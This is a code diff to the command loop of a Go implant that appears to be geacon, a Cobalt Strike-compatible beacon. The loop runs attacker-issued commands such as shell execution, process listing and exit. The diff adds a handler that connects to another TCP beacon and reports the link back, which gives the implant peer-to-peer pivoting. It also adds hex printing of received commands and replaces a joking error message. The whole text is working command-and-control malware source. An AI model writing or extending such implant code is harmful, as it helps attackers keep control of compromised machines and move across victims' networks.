@@ -44,6 +44,7 @@ func main() {
 								cmdType, cmdBuf := packet.ParsePacket(decryptedBuf, &packetLen)
 								if cmdBuf != nil {
 									fmt.Printf("cmdType is %d\n", cmdType)
+									fmt.Printf("%x\n", cmdBuf)
 									switch cmdType {
 									//shell
 									case packet.CMD_TYPE_SHELL:
@@ -141,6 +142,13 @@ func main() {
 										processList := packet.ListProcesses()
 										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_OUTPUT_PS, processList)
 										packet.PushResult(finalPacket)
+									case packet.CMD_TYPE_CONNECT:
+										target, port := packet.ParseCommandConnect(cmdBuf)
+										fmt.Printf("Attempting to connect to TCP beacon on %s:%d\n", target, port)
+										beaconId, encryptedMetaData := packet.ConnectTcpBeacon(target, port)
+										result := util.BytesCombine(packet.WriteInt(0), packet.WriteInt(beaconId), encryptedMetaData)
+										finalPacket := packet.MakePacket(packet.BEACON_RSP_BEACON_LINK, result)
+										packet.PushResult(finalPacket)
 									case packet.CMD_TYPE_EXIT:
 										os.Exit(0)
 									default:
@@ -148,7 +156,7 @@ func main() {
 										errIdBytes := packet.WriteInt(0) // must be zero
 										arg1Bytes := packet.WriteInt(0)  // for debug
 										arg2Bytes := packet.WriteInt(0)
-										errMsgBytes := []byte("You are now using geacon coded by darkr4y,and he may not have implemented this feature yet cuz life is shit.")
+										errMsgBytes := []byte("The feature you are trying to use is not implemented yet.")
 										result := util.BytesCombine(errIdBytes, arg1Bytes, arg2Bytes, errMsgBytes)
 										finalPaket := packet.MakePacket(31, result)
 										packet.PushResult(finalPaket)
